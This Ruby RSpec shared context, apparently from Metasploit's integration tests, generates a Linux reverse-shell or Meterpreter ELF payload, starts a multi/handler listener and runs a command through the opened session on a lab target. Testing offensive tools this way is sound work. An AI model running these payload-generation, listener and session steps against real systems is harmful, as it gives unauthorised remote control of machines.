# frozen_string_literal: true

RSpec.shared_context 'native Linux session' do
  def open_native_session(kind, delivery, user: 'root')
    console_command('back')
    console_command("use payload/#{delivery.fetch(:payload)}")
    console_command("set LHOST #{listener_host}")
    console_command('set LPORT 4444')
    path = File.join(target_runtime.fetch('artifacts'), delivery.fetch(:file))
    generated = console_command("generate -f #{delivery.fetch(:format)} -o #{path}")
    expect(generated).not_to match(/\[-\]|Exception|Unknown command/)
    bytes = File.binread(path)
    expect(bytes).not_to be_empty
    expect(bytes).to start_with("\x7fELF")
    console_command('back')
    console_command('use exploit/multi/handler')
    console_command("set PAYLOAD #{delivery.fetch(:payload)}")
    console_command("set LHOST #{listener_host}")
    console_command('set LPORT 4444')
    console_command('set ExitOnSession false')
    console_command('run -j')
    wait_for_expect(20, 0.1) do
      listening = target_exec('framework', 'ruby', '-e', 'puts File.readlines("/proc/net/tcp").drop(1).any? { |line| row = line.split; row[1].split(":").last.to_i(16) == 4444 && row[3] == "0A" }')
      expect(listening.strip).to eq('true')
    end
    target_exec('linux', 'python3', '/opt/launch_session.py', "/opt/module-target-artifacts/#{delivery.fetch(:file)}", user)
    opened = nil
    wait_for_expect(60, 0.2) do
      sessions = console_command('sessions -l')
      opened = sessions[/^\s*(\d+)\s+.*\b#{Regexp.escape(kind)}\b/i, 1]
      expect(opened).not_to be_nil, sessions
      # Registration precedes bootstrap. The open event is emitted only after
      # stdapi/shell initialization finishes (Msf::Handler#register_session).
      label = kind == 'shell' ? 'Command shell' : 'Meterpreter'
      expect(console.all_data).to include("#{label} session #{opened} opened")
    end
    target_exec('linux', 'test', '!', '-e', '/tmp/module-target-session-proof')
    command = kind == 'meterpreter' ? 'execute -f /usr/bin/touch -a /tmp/module-target-session-proof' : '/usr/bin/touch /tmp/module-target-session-proof'
    flag = kind == 'meterpreter' ? '-C' : '-c'
    proof = console_command("sessions -i #{opened} #{flag} #{command.inspect}")
    expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
    wait_for_expect(10, 0.1) { expect(target_exec('linux', 'test', '-f', '/tmp/module-target-session-proof')).to eq('') }
    expect(target_exec('linux', 'stat', '-c', '%U', '/tmp/module-target-session-proof').strip).to eq(user)
    opened
  end
end
